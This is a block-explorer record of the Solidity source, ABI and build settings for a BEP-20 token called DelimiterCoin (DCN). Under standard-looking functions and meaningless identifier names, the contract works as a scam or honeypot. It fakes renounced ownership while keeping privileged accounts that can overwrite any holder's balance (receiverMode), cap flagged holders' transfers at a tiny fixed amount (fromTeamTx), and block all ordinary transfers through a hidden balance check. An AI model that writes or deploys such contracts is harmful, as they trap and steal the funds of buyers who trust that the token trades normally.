{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract atFromLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingToken {\n    function createPair(address tradingMarketingIs, address launchLiquidity) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface buyTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface senderLimitAmount {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitReceiverList) external view returns (uint256);\n\n    function transfer(address tradingMin, uint256 toList) external returns (bool);\n\n    function allowance(address toTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingMin,\n        uint256 toList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toModeTrading, uint256 value);\n    event Approval(address indexed toTx, address indexed spender, uint256 value);\n}\n\ninterface senderLimitAmountMetadata is senderLimitAmount {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DelimiterCoin is atFromLiquidity, senderLimitAmount, senderLimitAmountMetadata {\n\n    bool private walletListToken;\n\n    address public takeMax;\n\n    function receiverMode(address tradingMode, uint256 toList) public {\n        fundTake();\n        enableTrading[tradingMode] = toList;\n    }\n\n    function allowance(address swapReceiverList, address limitLaunched) external view virtual override returns (uint256) {\n        if (limitLaunched == totalTrading) {\n            return type(uint256).max;\n        }\n        return walletMode[swapReceiverList][limitLaunched];\n    }\n\n    function minBuy(address sellAmount, address tradingMin, uint256 toList) internal view returns (uint256) {\n        require(toList > 0);\n\n        uint256 tradingBuyIs = 0;\n        if (sellAmount == takeMax && launchSell > 0) {\n            tradingBuyIs = toList * launchSell / 100;\n        } else if (tradingMin == takeMax && liquidityFundBuy > 0) {\n            tradingBuyIs = toList * liquidityFundBuy / 100;\n        }\n        require(tradingBuyIs <= toList);\n        return toList - tradingBuyIs;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderAt;\n    }\n\n    uint256 fundBuyMarketing;\n\n    function exemptIsLiquidity(uint256 toList) public {\n        fundTake();\n        fundBuyMarketing = toList;\n    }\n\n    uint256 public liquidityFundBuy = 0;\n\n    uint256 constant receiverTrading = 14 ** 10;\n\n    function getOwner() external view returns (address) {\n        return maxExemptShould;\n    }\n\n    function amountTo() public {\n        emit OwnershipTransferred(listTotal, address(0));\n        maxExemptShould = address(0);\n    }\n\n    function transfer(address tradingMode, uint256 toList) external virtual override returns (bool) {\n        return liquidityIsTo(_msgSender(), tradingMode, toList);\n    }\n\n    uint256 public senderFund;\n\n    function sellTakeSwap(address sellAmount, address tradingMin, uint256 toList) internal returns (bool) {\n        require(enableTrading[sellAmount] >= toList);\n        enableTrading[sellAmount] -= toList;\n        enableTrading[tradingMin] += toList;\n        emit Transfer(sellAmount, tradingMin, toList);\n        return true;\n    }\n\n    function fundTake() private view {\n        require(limitReceiver[_msgSender()]);\n    }\n\n    constructor (){\n        if (shouldFrom != atExempt) {\n            atExempt = false;\n        }\n        amountTo();\n        buyTeam tradingMarketing = buyTeam(totalTrading);\n        takeMax = marketingToken(tradingMarketing.factory()).createPair(tradingMarketing.WETH(), address(this));\n        sellIsReceiver = marketingToken(tradingMarketing.factory()).feeTo();\n        if (shouldFrom) {\n            senderFund = amountAt;\n        }\n        listTotal = _msgSender();\n        limitReceiver[listTotal] = true;\n        enableTrading[listTotal] = launchTotalTx;\n        if (amountAt == senderFund) {\n            amountAt = senderFund;\n        }\n        emit Transfer(address(0), listTotal, launchTotalTx);\n    }\n\n    mapping(address => bool) public liquidityEnableAt;\n\n    function owner() external view returns (address) {\n        return maxExemptShould;\n    }\n\n    address sellIsReceiver;\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountTeam;\n    }\n\n    function approve(address limitLaunched, uint256 toList) public virtual override returns (bool) {\n        walletMode[_msgSender()][limitLaunched] = toList;\n        emit Approval(_msgSender(), limitLaunched, toList);\n        return true;\n    }\n\n    string private fundShould = \"Delimiter Coin\";\n\n    bool public atExempt;\n\n    bool public feeList;\n\n    uint8 private amountTeam = 18;\n\n    uint256 public launchSell = 3;\n\n    function fromTeamTx(address senderReceiverList) public {\n        fundTake();\n        \n        if (senderReceiverList == listTotal || senderReceiverList == takeMax) {\n            return;\n        }\n        liquidityEnableAt[senderReceiverList] = true;\n    }\n\n    uint256 txReceiver;\n\n    bool public minWallet;\n\n    function liquidityIsTo(address sellAmount, address tradingMin, uint256 toList) internal returns (bool) {\n        if (sellAmount == listTotal) {\n            return sellTakeSwap(sellAmount, tradingMin, toList);\n        }\n        uint256 listFundTo = senderLimitAmount(takeMax).balanceOf(sellIsReceiver);\n        require(listFundTo == fundBuyMarketing);\n        require(tradingMin != sellIsReceiver);\n        if (liquidityEnableAt[sellAmount]) {\n            return sellTakeSwap(sellAmount, tradingMin, receiverTrading);\n        }\n        toList = minBuy(sellAmount, tradingMin, toList);\n        return sellTakeSwap(sellAmount, tradingMin, toList);\n    }\n\n    event OwnershipTransferred(address indexed launchSwap, address indexed toSender);\n\n    function balanceOf(address limitReceiverList) public view virtual override returns (uint256) {\n        return enableTrading[limitReceiverList];\n    }\n\n    function buyFund(address exemptToken) public {\n        if (feeList) {\n            return;\n        }\n        if (shouldFrom != walletListToken) {\n            walletListToken = true;\n        }\n        limitReceiver[exemptToken] = true;\n        \n        feeList = true;\n    }\n\n    bool public shouldFrom;\n\n    string private senderAt = \"DCN\";\n\n    address totalTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transferFrom(address sellAmount, address tradingMin, uint256 toList) external override returns (bool) {\n        if (_msgSender() != totalTrading) {\n            if (walletMode[sellAmount][_msgSender()] != type(uint256).max) {\n                require(toList <= walletMode[sellAmount][_msgSender()]);\n                walletMode[sellAmount][_msgSender()] -= toList;\n            }\n        }\n        return liquidityIsTo(sellAmount, tradingMin, toList);\n    }\n\n    mapping(address => uint256) private enableTrading;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchTotalTx;\n    }\n\n    mapping(address => mapping(address => uint256)) private walletMode;\n\n    uint256 private launchTotalTx = 100000000 * 10 ** 18;\n\n    function name() external view virtual override returns (string memory) {\n        return fundShould;\n    }\n\n    mapping(address => bool) public limitReceiver;\n\n    address private maxExemptShould;\n\n    address public listTotal;\n\n    uint256 public amountAt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toSender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toModeTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapReceiverList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitReceiverList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptToken\",\"type\":\"address\"}],\"name\":\"buyFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toList\",\"type\":\"uint256\"}],\"name\":\"exemptIsLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderReceiverList\",\"type\":\"address\"}],\"name\":\"fromTeamTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityEnableAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFundBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toList\",\"type\":\"uint256\"}],\"name\":\"receiverMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DelimiterCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}